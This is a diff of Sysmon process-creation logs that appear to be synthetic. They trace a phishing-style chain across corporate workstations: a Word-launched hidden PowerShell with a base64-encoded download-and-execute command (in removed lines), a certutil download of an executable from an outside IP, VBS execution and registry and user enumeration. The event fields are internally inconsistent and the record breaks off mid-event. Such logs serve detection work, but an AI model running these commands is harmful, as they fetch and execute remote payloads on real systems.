@@ -8,8 +8,51 @@
       <Task>1</Task>
       <Opcode>0</Opcode>
       <Keywords>0x8000000000000000</Keywords>
-      <TimeCreated SystemTime="2026-07-26T14:32:07.1234567Z"/>
-      <EventRecordID>184512</EventRecordID>
+      <TimeCreated SystemTime="2026-07-26T08:00:00.2341057Z"/>
+      <EventRecordID>184000</EventRecordID>
+      <Correlation/>
+      <Execution ProcessID="3456" ThreadID="3980"/>
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>WORKSTATION15.corp.local</Computer>
+      <Security UserID="S-1-5-18"/>
+    </System>
+    <EventData>
+      <Data Name="RuleName">-</Data>
+      <Data Name="UtcTime">2026-07-26 08:00:00.228</Data>
+      <Data Name="ProcessGuid">{bc8960a9-1a3d-ad3c-bd9c-8b9de465e150}</Data>
+      <Data Name="ProcessId">2424</Data>
+      <Data Name="Image">C:\Windows\System32\wscript.exe</Data>
+      <Data Name="FileVersion">10.0.19041.2419</Data>
+      <Data Name="Description">-</Data>
+      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
+      <Data Name="Company">Microsoft Corporation</Data>
+      <Data Name="OriginalFileName">wscript.exe</Data>
+      <Data Name="CommandLine">wscript.exe //B "C:\Users\mrodriguez\Downloads\invoice.vbs"</Data>
+      <Data Name="CurrentDirectory">C:\Users\jdoe\</Data>
+      <Data Name="User">CORP\jdoe</Data>
+      <Data Name="LogonGuid">{6c031199-0822-07a0-17fc-3b8f37f8a88b}</Data>
+      <Data Name="LogonId">0x915ef6</Data>
+      <Data Name="TerminalSessionId">3</Data>
+      <Data Name="IntegrityLevel">Medium</Data>
+      <Data Name="Hashes">MD5=B74D0FB132E706298FADC1A606CB0FB3,SHA256=4737819096DA1DAC72FF5D2A386ECBE06B65A6A48B8148F6B38A088CA65ED389,IMPHASH=C241330B01A9E71FDE8A774BCF36D58B</Data>
+      <Data Name="ParentProcessGuid">{ce4a2bbd-28df-b2b9-6c30-4722571aa876}</Data>
+      <Data Name="ParentProcessId">3547</Data>
+      <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+      <Data Name="ParentCommandLine">"C:\Windows\System32\cmd.exe"</Data>
+      <Data Name="ParentUser">CORP\jdoe</Data>
+    </EventData>
+  </Event>
+  <Event>
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
+      <EventID>1</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>1</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2026-07-26T08:01:42.6022674Z"/>
+      <EventRecordID>184001</EventRecordID>
       <Correlation/>
       <Execution ProcessID="3456" ThreadID="3980"/>
       <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
@@ -18,27 +61,27 @@
     </System>
     <EventData>
       <Data Name="RuleName">-</Data>
-      <Data Name="UtcTime">2026-07-26 14:32:07.123</Data>
-      <Data Name="ProcessGuid">{4f3a2b1c-6e9d-6889-1a00-000000001f00}</Data>
-      <Data Name="ProcessId">6784</Data>
-      <Data Name="Image">C:\Windows\System32\whoami.exe</Data>
-      <Data Name="FileVersion">10.0.19041.1 (WinBuild.160101.0800)</Data>
-      <Data Name="Description">Displays user, group and privileges information</Data>
-      <Data Name="Product">Microsoft® Windows® Operating System</Data>
+      <Data Name="UtcTime">2026-07-26 08:01:42.099</Data>
+      <Data Name="ProcessGuid">{d8f56413-580d-9a8d-43b7-0b1fce9ff57f}</Data>
+      <Data Name="ProcessId">8527</Data>
+      <Data Name="Image">C:\Windows\System32\net.exe</Data>
+      <Data Name="FileVersion">10.0.19041.2197</Data>
+      <Data Name="Description">-</Data>
+      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
       <Data Name="Company">Microsoft Corporation</Data>
-      <Data Name="OriginalFileName">whoami.exe</Data>
-      <Data Name="CommandLine">whoami.exe /all</Data>
+      <Data Name="OriginalFileName">net.exe</Data>
+      <Data Name="CommandLine">net.exe user</Data>
       <Data Name="CurrentDirectory">C:\Users\jdoe\</Data>
       <Data Name="User">CORP\jdoe</Data>
-      <Data Name="LogonGuid">{4f3a2b1c-6cf1-6889-1a00-0000000e1c00}</Data>
-      <Data Name="LogonId">0x1c0e00</Data>
-      <Data Name="TerminalSessionId">1</Data>
+      <Data Name="LogonGuid">{1ff49b78-f91e-ec1b-60e7-8d52142c3fe8}</Data>
+      <Data Name="LogonId">0x5b0dbb</Data>
+      <Data Name="TerminalSessionId">3</Data>
       <Data Name="IntegrityLevel">Medium</Data>
-      <Data Name="Hashes">MD5=8350AC0FB48819CA79C8F0DD8C702166,SHA256=2E4A1051D9D9FB8AD09B4A9E19B75F8C6F7F2D4A18F9A8C21C6F6E4EC1D3B2A7,IMPHASH=F34D5F2D4577ED6D9CEEC516C1F5A744</Data>
-      <Data Name="ParentProcessGuid">{4f3a2b1c-6cf5-6889-0e00-000000001f00}</Data>
-      <Data Name="ParentProcessId">4512</Data>
-      <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
-      <Data Name="ParentCommandLine">"C:\Windows\System32\cmd.exe"</Data>
+      <Data Name="Hashes">MD5=5C941CF0DC98D2C1E2ACF72F9E574F7A,SHA256=C5E7CE8A3A578A8EA9488D990BBB259911CE5DD2B45ED1F03139D32C93CD59BF,IMPHASH=DAF61A26146D3F31FC377A4C4A15544D</Data>
+      <Data Name="ParentProcessGuid">{3b982ef8-ddd1-19db-614f-741247294739}</Data>
+      <Data Name="ParentProcessId">6977</Data>
+      <Data Name="ParentImage">C:\Windows\System32\services.exe</Data>
+      <Data Name="ParentCommandLine">C:\Windows\System32\services.exe</Data>
       <Data Name="ParentUser">CORP\jdoe</Data>
     </EventData>
   </Event>
@@ -51,51 +94,8 @@
       <Task>1</Task>
       <Opcode>0</Opcode>
       <Keywords>0x8000000000000000</Keywords>
-      <TimeCreated SystemTime="2026-07-26T14:35:41.9871234Z"/>
-      <EventRecordID>184519</EventRecordID>
-      <Correlation/>
-      <Execution ProcessID="3456" ThreadID="3980"/>
-      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
-      <Computer>WORKSTATION07.corp.local</Computer>
-      <Security UserID="S-1-5-18"/>
-    </System>
-    <EventData>
-      <Data Name="RuleName">technique_id=T1059.001,technique_name=PowerShell</Data>
-      <Data Name="UtcTime">2026-07-26 14:35:41.987</Data>
-      <Data Name="ProcessGuid">{4f3a2b1c-6ee5-6889-1e00-000000001f00}</Data>
-      <Data Name="ProcessId">7920</Data>
-      <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
-      <Data Name="FileVersion">10.0.19041.3208 (WinBuild.160101.0800)</Data>
-      <Data Name="Description">Windows PowerShell</Data>
-      <Data Name="Product">Microsoft® Windows® Operating System</Data>
-      <Data Name="Company">Microsoft Corporation</Data>
-      <Data Name="OriginalFileName">PowerShell.EXE</Data>
-      <Data Name="CommandLine">powershell.exe -NoProfile -ExecutionPolicy Bypass</Data>
-      <Data Name="CurrentDirectory">C:\Users\jdoe\</Data>
-      <Data Name="User">CORP\jdoe</Data>
-      <Data Name="LogonGuid">{4f3a2b1c-6cf1-6889-1a00-0000000e1c00}</Data>
-      <Data Name="LogonId">0x1c0e00</Data>
-      <Data Name="TerminalSessionId">1</Data>
-      <Data Name="IntegrityLevel">Medium</Data>
-      <Data Name="Hashes">MD5=04029E121A0CFA5991749937DD22A1D9,SHA256=A907E9B5AD9E9D5F1D2C4E9A73B6C1D8F2E4A6B8C0D2E4F6A8B0C2D4E6F8A0B1,IMPHASH=1A6B2C3D4E5F60718293A4B5C6D7E8F9</Data>
-      <Data Name="ParentProcessGuid">{4f3a2b1c-6cf5-6889-0e00-000000001f00}</Data>
-      <Data Name="ParentProcessId">4512</Data>
-      <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
-      <Data Name="ParentCommandLine">"C:\Windows\System32\cmd.exe"</Data>
-      <Data Name="ParentUser">CORP\jdoe</Data>
-    </EventData>
-  </Event>
-  <Event>
-    <System>
-      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
-      <EventID>1</EventID>
-      <Version>5</Version>
-      <Level>4</Level>
-      <Task>1</Task>
-      <Opcode>0</Opcode>
-      <Keywords>0x8000000000000000</Keywords>
-      <TimeCreated SystemTime="2026-07-26T09:14:52.4456781Z"/>
-      <EventRecordID>184203</EventRecordID>
+      <TimeCreated SystemTime="2026-07-26T08:05:52.1197935Z"/>
+      <EventRecordID>184002</EventRecordID>
       <Correlation/>
       <Execution ProcessID="3456" ThreadID="3980"/>
       <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
@@ -103,29 +103,1190 @@
       <Security UserID="S-1-5-18"/>
     </System>
     <EventData>
-      <Data Name="RuleName">technique_id=T1059.001,technique_name=PowerShell;technique_id=T1027,technique_name=Obfuscated Files or Information</Data>
-      <Data Name="UtcTime">2026-07-26 09:14:52.445</Data>
-      <Data Name="ProcessGuid">{7c9e1a4d-5b34-6889-2200-000000001f00}</Data>
-      <Data Name="ProcessId">5164</Data>
+      <Data Name="RuleName">-</Data>
+      <Data Name="UtcTime">2026-07-26 08:05:52.273</Data>
+      <Data Name="ProcessGuid">{9bf00273-a28d-2bcf-88bd-3eabbaa80dd4}</Data>
+      <Data Name="ProcessId">3677</Data>
       <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
-      <Data Name="FileVersion">10.0.19041.3208 (WinBuild.160101.0800)</Data>
-      <Data Name="Description">Windows PowerShell</Data>
-      <Data Name="Product">Microsoft® Windows® Operating System</Data>
+      <Data Name="FileVersion">10.0.19041.1894</Data>
+      <Data Name="Description">-</Data>
+      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
       <Data Name="Company">Microsoft Corporation</Data>
-      <Data Name="OriginalFileName">PowerShell.EXE</Data>
-      <Data Name="CommandLine">powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8ANAA1AC4ANwA3AC4ANgA1AC4AMQAwADIALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA==</Data>
-      <Data Name="CurrentDirectory">C:\Users\mrodriguez\Downloads\</Data>
+      <Data Name="OriginalFileName">powershell.exe</Data>
+      <Data Name="CommandLine">powershell.exe -NoProfile -ExecutionPolicy Bypass</Data>
+      <Data Name="CurrentDirectory">C:\Users\asingh\</Data>
+      <Data Name="User">CORP\asingh</Data>
+      <Data Name="LogonGuid">{6123fdf7-451b-fd51-ece6-b02ba3d70628}</Data>
+      <Data Name="LogonId">0x9e9442</Data>
+      <Data Name="TerminalSessionId">1</Data>
+      <Data Name="IntegrityLevel">Medium</Data>
+      <Data Name="Hashes">MD5=C4B032CCD7C524A55304317FAF42E12F,SHA256=66B2BC5B50C187FCCE177B4E0837B8A3D261A7AB3AA2E4F90E51F30DC6A7EE39,IMPHASH=E9C349E03602F8AC10F1BC81448AAA9E</Data>
+      <Data Name="ParentProcessGuid">{f16287e4-9132-e059-b7c9-366e508ebad7}</Data>
+      <Data Name="ParentProcessId">9179</Data>
+      <Data Name="ParentImage">C:\Windows\System32\services.exe</Data>
+      <Data Name="ParentCommandLine">C:\Windows\System32\services.exe</Data>
+      <Data Name="ParentUser">CORP\asingh</Data>
+    </EventData>
+  </Event>
+  <Event>
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
+      <EventID>1</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>1</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2026-07-26T08:02:00.9418194Z"/>
+      <EventRecordID>184003</EventRecordID>
+      <Correlation/>
+      <Execution ProcessID="3456" ThreadID="3980"/>
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>WORKSTATION15.corp.local</Computer>
+      <Security UserID="S-1-5-18"/>
+    </System>
+    <EventData>
+      <Data Name="RuleName">-</Data>
+      <Data Name="UtcTime">2026-07-26 08:02:00.252</Data>
+      <Data Name="ProcessGuid">{89fa6a68-4343-bf3c-95a7-e5d76dadd6c7}</Data>
+      <Data Name="ProcessId">7543</Data>
+      <Data Name="Image">C:\Windows\System32\reg.exe</Data>
+      <Data Name="FileVersion">10.0.19041.1483</Data>
+      <Data Name="Description">-</Data>
+      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
+      <Data Name="Company">Microsoft Corporation</Data>
+      <Data Name="OriginalFileName">reg.exe</Data>
+      <Data Name="CommandLine">reg.exe query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run"</Data>
+      <Data Name="CurrentDirectory">C:\Users\mrodriguez\</Data>
       <Data Name="User">CORP\mrodriguez</Data>
-      <Data Name="LogonGuid">{7c9e1a4d-4f02-6889-2100-0000000f2100}</Data>
-      <Data Name="LogonId">0x21000f</Data>
+      <Data Name="LogonGuid">{382567b8-ff50-ff5e-2369-7e57827050a8}</Data>
+      <Data Name="LogonId">0x2745d6</Data>
+      <Data Name="TerminalSessionId">1</Data>
+      <Data Name="IntegrityLevel">Medium</Data>
+      <Data Name="Hashes">MD5=A0A04DC427209BDF1C11F735DC713D96,SHA256=61B1CD2262801C4510435A1098AE43346C12ACE8AE340454CAC5B68C28F49481,IMPHASH=877409A977D21E02FF01CF99988C24C9</Data>
+      <Data Name="ParentProcessGuid">{405cacec-f898-8da0-dc5c-02f0f143262f}</Data>
+      <Data Name="ParentProcessId">2876</Data>
+      <Data Name="ParentImage">C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE</Data>
+      <Data Name="ParentCommandLine">"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" /n</Data>
+      <Data Name="ParentUser">CORP\mrodriguez</Data>
+    </EventData>
+  </Event>
+  <Event>
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
+      <EventID>1</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>1</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2026-07-26T08:02:12.7294150Z"/>
+      <EventRecordID>184004</EventRecordID>
+      <Correlation/>
+      <Execution ProcessID="3456" ThreadID="3980"/>
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>WORKSTATION15.corp.local</Computer>
+      <Security UserID="S-1-5-18"/>
+    </System>
+    <EventData>
+      <Data Name="RuleName">-</Data>
+      <Data Name="UtcTime">2026-07-26 08:02:12.300</Data>
+      <Data Name="ProcessGuid">{287d06ca-7427-00d4-f42d-e037b8db0672}</Data>
+      <Data Name="ProcessId">5315</Data>
+      <Data Name="Image">C:\Windows\System32\wscript.exe</Data>
+      <Data Name="FileVersion">10.0.19041.2051</Data>
+      <Data Name="Description">-</Data>
+      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
+      <Data Name="Company">Microsoft Corporation</Data>
+      <Data Name="OriginalFileName">wscript.exe</Data>
+      <Data Name="CommandLine">wscript.exe //B "C:\Users\mrodriguez\Downloads\invoice.vbs"</Data>
+      <Data Name="CurrentDirectory">C:\Users\asingh\</Data>
+      <Data Name="User">CORP\asingh</Data>
+      <Data Name="LogonGuid">{c30ff46e-2dbc-81f7-e9a1-deda1b3dbd5c}</Data>
+      <Data Name="LogonId">0xb013ac</Data>
       <Data Name="TerminalSessionId">2</Data>
       <Data Name="IntegrityLevel">Medium</Data>
-      <Data Name="Hashes">MD5=04029E121A0CFA5991749937DD22A1D9,SHA256=A907E9B5AD9E9D5F1D2C4E9A73B6C1D8F2E4A6B8C0D2E4F6A8B0C2D4E6F8A0B1,IMPHASH=1A6B2C3D4E5F60718293A4B5C6D7E8F9</Data>
-      <Data Name="ParentProcessGuid">{7c9e1a4d-4f9a-6889-2100-000000001f00}</Data>
-      <Data Name="ParentProcessId">2988</Data>
-      <Data Name="ParentImage">C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE</Data>
-      <Data Name="ParentCommandLine">"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" /n "C:\Users\mrodriguez\Downloads\Invoice_84512.docm"</Data>
+      <Data Name="Hashes">MD5=9BE578C781F631D4A39231A7D777A477,SHA256=C754108FF4188F3F8A14BE62295B4715C333E8615FB8D16C2720797D32EBD689,IMPHASH=00257AD1EB2263DD87C5421EEC24A3C5</Data>
+      <Data Name="ParentProcessGuid">{99546eb4-52fb-7d15-04fc-edd91ca35cfb}</Data>
+      <Data Name="ParentProcessId">6947</Data>
+      <Data Name="ParentImage">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+      <Data Name="ParentCommandLine">powershell.exe -NoProfile</Data>
+      <Data Name="ParentUser">CORP\asingh</Data>
+    </EventData>
+  </Event>
+  <Event>
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
+      <EventID>1</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>1</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2026-07-26T08:05:30.9518669Z"/>
+      <EventRecordID>184005</EventRecordID>
+      <Correlation/>
+      <Execution ProcessID="3456" ThreadID="3980"/>
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>WORKSTATION07.corp.local</Computer>
+      <Security UserID="S-1-5-18"/>
+    </System>
+    <EventData>
+      <Data Name="RuleName">-</Data>
+      <Data Name="UtcTime">2026-07-26 08:05:30.899</Data>
+      <Data Name="ProcessGuid">{f26b4776-1429-15ed-bb5e-d0e67c69dee1}</Data>
+      <Data Name="ProcessId">2133</Data>
+      <Data Name="Image">C:\Windows\System32\notepad.exe</Data>
+      <Data Name="FileVersion">10.0.19041.3116</Data>
+      <Data Name="Description">-</Data>
+      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
+      <Data Name="Company">Microsoft Corporation</Data>
+      <Data Name="OriginalFileName">notepad.exe</Data>
+      <Data Name="CommandLine">notepad.exe C:\Users\jdoe\Desktop\notes.txt</Data>
+      <Data Name="CurrentDirectory">C:\Users\mrodriguez\</Data>
+      <Data Name="User">CORP\mrodriguez</Data>
+      <Data Name="LogonGuid">{885f6e66-c40d-2031-20de-79aca8e56e0c}</Data>
+      <Data Name="LogonId">0x9cbfed</Data>
+      <Data Name="TerminalSessionId">1</Data>
+      <Data Name="IntegrityLevel">Low</Data>
+      <Data Name="Hashes">MD5=9B49BD26DF57C59A8715A10343DAC043,SHA256=B09B2A5CBADCC32AC1590F538A0F4EFBEDCD465E36386821F6E07CC06C52C49F,IMPHASH=66245BFA4FCCA39AB683D2E6337EA2DF</Data>
+      <Data Name="ParentProcessGuid">{fec21bbe-abf3-a65e-5f98-e64d702753a1}</Data>
+      <Data Name="ParentProcessId">9479</Data>
+      <Data Name="ParentImage">C:\Windows\System32\services.exe</Data>
+      <Data Name="ParentCommandLine">C:\Windows\System32\services.exe</Data>
       <Data Name="ParentUser">CORP\mrodriguez</Data>
+    </EventData>
+  </Event>
+  <Event>
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
+      <EventID>1</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>1</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2026-07-26T08:02:06.0352896Z"/>
+      <EventRecordID>184006</EventRecordID>
+      <Correlation/>
+      <Execution ProcessID="3456" ThreadID="3980"/>
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>WORKSTATION22.corp.local</Computer>
+      <Security UserID="S-1-5-18"/>
+    </System>
+    <EventData>
+      <Data Name="RuleName">-</Data>
+      <Data Name="UtcTime">2026-07-26 08:02:06.346</Data>
+      <Data Name="ProcessGuid">{969b6662-8dcd-3ae8-96a4-01d738602ab6}</Data>
+      <Data Name="ProcessId">2163</Data>
+      <Data Name="Image">C:\Windows\System32\rundll32.exe</Data>
+      <Data Name="FileVersion">10.0.19041.2900</Data>
+      <Data Name="Description">-</Data>
+      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
+      <Data Name="Company">Microsoft Corporation</Data>
+      <Data Name="OriginalFileName">rundll32.exe</Data>
+      <Data Name="CommandLine">rundll32.exe shell32.dll,ShellExec_RunDLL</Data>
+      <Data Name="CurrentDirectory">C:\Users\mrodriguez\</Data>
+      <Data Name="User">CORP\mrodriguez</Data>
+      <Data Name="LogonGuid">{a18ff6b6-0f12-3a9b-1141-080ae7c99b26}</Data>
+      <Data Name="LogonId">0xec1110</Data>
+      <Data Name="TerminalSessionId">2</Data>
+      <Data Name="IntegrityLevel">Medium</Data>
+      <Data Name="Hashes">MD5=474A493B3CEDDF2D839FBC501223B513,SHA256=E1E3DB63EF7DDC76B92DA22B21DF306F8A0B3C3336D8393A7C441FE7AB4220A7,IMPHASH=3E3511287900F7F993829B43922FE15A</Data>
+      <Data Name="ParentProcessGuid">{c8dcd19f-7914-ceb8-6835-182530beb45f}</Data>
+      <Data Name="ParentProcessId">2588</Data>
+      <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+      <Data Name="ParentCommandLine">"C:\Windows\System32\cmd.exe"</Data>
+      <Data Name="ParentUser">CORP\mrodriguez</Data>
+    </EventData>
+  </Event>
+  <Event>
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
+      <EventID>1</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>1</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2026-07-26T08:12:50.0908841Z"/>
+      <EventRecordID>184007</EventRecordID>
+      <Correlation/>
+      <Execution ProcessID="3456" ThreadID="3980"/>
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>SRV-FILE01.corp.local</Computer>
+      <Security UserID="S-1-5-18"/>
+    </System>
+    <EventData>
+      <Data Name="RuleName">-</Data>
+      <Data Name="UtcTime">2026-07-26 08:12:50.478</Data>
+      <Data Name="ProcessGuid">{ac619e63-a748-fbf2-a56c-0f841931e9ee}</Data>
+      <Data Name="ProcessId">7596</Data>
+      <Data Name="Image">C:\Windows\System32\wscript.exe</Data>
+      <Data Name="FileVersion">10.0.19041.2983</Data>
+      <Data Name="Description">-</Data>
+      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
+      <Data Name="Company">Microsoft Corporation</Data>
+      <Data Name="OriginalFileName">wscript.exe</Data>
+      <Data Name="CommandLine">wscript.exe //B "C:\Users\mrodriguez\Downloads\invoice.vbs"</Data>
+      <Data Name="CurrentDirectory">C:\Users\asingh\</Data>
+      <Data Name="User">CORP\asingh</Data>
+      <Data Name="LogonGuid">{56dc8907-ccf3-dc96-1bf9-310c3fa7f104}</Data>
+      <Data Name="LogonId">0x40b187</Data>
+      <Data Name="TerminalSessionId">3</Data>
+      <Data Name="IntegrityLevel">Medium</Data>
+      <Data Name="Hashes">MD5=2EF912766C006F6123E2FCB472D8567D,SHA256=CEDA8BBB71710434134C6C92EC5B227CDFDE4FBF3FF350BF766ECB15474EBC19,IMPHASH=19108BE58CE21EA3DB20A56EDC815FE7</Data>
+      <Data Name="ParentProcessGuid">{0cf35b58-a6f2-ffd0-8a63-03c7d605e770}</Data>
+      <Data Name="ParentProcessId">2528</Data>
+      <Data Name="ParentImage">C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE</Data>
+      <Data Name="ParentCommandLine">"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" /n</Data>
+      <Data Name="ParentUser">CORP\asingh</Data>
+    </EventData>
+  </Event>
+  <Event>
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
+      <EventID>1</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>1</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2026-07-26T08:17:12.3586084Z"/>
+      <EventRecordID>184008</EventRecordID>
+      <Correlation/>
+      <Execution ProcessID="3456" ThreadID="3980"/>
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>SRV-FILE01.corp.local</Computer>
+      <Security UserID="S-1-5-18"/>
+    </System>
+    <EventData>
+      <Data Name="RuleName">-</Data>
+      <Data Name="UtcTime">2026-07-26 08:17:12.492</Data>
+      <Data Name="ProcessGuid">{dd59ba71-66aa-e706-0f02-61042a25a888}</Data>
+      <Data Name="ProcessId">1035</Data>
+      <Data Name="Image">C:\Windows\System32\notepad.exe</Data>
+      <Data Name="FileVersion">10.0.19041.1600</Data>
+      <Data Name="Description">-</Data>
+      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
+      <Data Name="Company">Microsoft Corporation</Data>
+      <Data Name="OriginalFileName">notepad.exe</Data>
+      <Data Name="CommandLine">notepad.exe C:\Users\jdoe\Desktop\notes.txt</Data>
+      <Data Name="CurrentDirectory">C:\Users\mrodriguez\</Data>
+      <Data Name="User">CORP\mrodriguez</Data>
+      <Data Name="LogonGuid">{43e458fc-ed30-c8b8-c8fe-4906747b6dba}</Data>
+      <Data Name="LogonId">0x7c4a37</Data>
+      <Data Name="TerminalSessionId">3</Data>
+      <Data Name="IntegrityLevel">Low</Data>
+      <Data Name="Hashes">MD5=C88A618EFED4057DBB026576F512C4C3,SHA256=37BB3EEC4BF50B52309D258C27A0C3D77C967F79B7E99ACAA97065E18E46D534,IMPHASH=BC594585944528C00EF8C2D6F7FD5646</Data>
+      <Data Name="ParentProcessGuid">{8acd4e10-0f9a-bf7b-5048-0cd60ea2622b}</Data>
+      <Data Name="ParentProcessId">8811</Data>
+      <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
+      <Data Name="ParentCommandLine">C:\Windows\explorer.exe</Data>
+      <Data Name="ParentUser">CORP\mrodriguez</Data>
+    </EventData>
+  </Event>
+  <Event>
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
+      <EventID>1</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>1</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2026-07-26T08:20:15.3117625Z"/>
+      <EventRecordID>184009</EventRecordID>
+      <Correlation/>
+      <Execution ProcessID="3456" ThreadID="3980"/>
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>WORKSTATION07.corp.local</Computer>
+      <Security UserID="S-1-5-18"/>
+    </System>
+    <EventData>
+      <Data Name="RuleName">-</Data>
+      <Data Name="UtcTime">2026-07-26 08:20:15.082</Data>
+      <Data Name="ProcessGuid">{118a9d29-9854-1165-acda-3c36dca02eec}</Data>
+      <Data Name="ProcessId">7615</Data>
+      <Data Name="Image">C:\Windows\System32\certutil.exe</Data>
+      <Data Name="FileVersion">10.0.19041.492</Data>
+      <Data Name="Description">-</Data>
+      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
+      <Data Name="Company">Microsoft Corporation</Data>
+      <Data Name="OriginalFileName">certutil.exe</Data>
+      <Data Name="CommandLine">certutil.exe -urlcache -split -f http://45.77.65.102/update.exe</Data>
+      <Data Name="CurrentDirectory">C:\Users\mrodriguez\</Data>
+      <Data Name="User">CORP\mrodriguez</Data>
+      <Data Name="LogonGuid">{f10c718b-e3e9-91d6-3f07-983294340a03}</Data>
+      <Data Name="LogonId">0x1a2c82</Data>
+      <Data Name="TerminalSessionId">3</Data>
+      <Data Name="IntegrityLevel">Medium</Data>
+      <Data Name="Hashes">MD5=956B8C0CA8499B926B5252E314FCDD54,SHA256=B758588DAB73295B344A54B842C18A62EF48E8D550FD9D3F85D5169590B2B633,IMPHASH=655238A643FF50113D1A85DD506E5A9A</Data>
+      <Data Name="ParentProcessGuid">{21813d25-abf3-a53f-4ccc-50f0750cab75}</Data>
+      <Data Name="ParentProcessId">2188</Data>
+      <Data Name="ParentImage">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+      <Data Name="ParentCommandLine">powershell.exe -NoProfile</Data>
+      <Data Name="ParentUser">CORP\mrodriguez</Data>
+    </EventData>
+  </Event>
+  <Event>
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
+      <EventID>1</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>1</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2026-07-26T08:03:50.3576135Z"/>
+      <EventRecordID>184010</EventRecordID>
+      <Correlation/>
+      <Execution ProcessID="3456" ThreadID="3980"/>
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>WORKSTATION07.corp.local</Computer>
+      <Security UserID="S-1-5-18"/>
+    </System>
+    <EventData>
+      <Data Name="RuleName">-</Data>
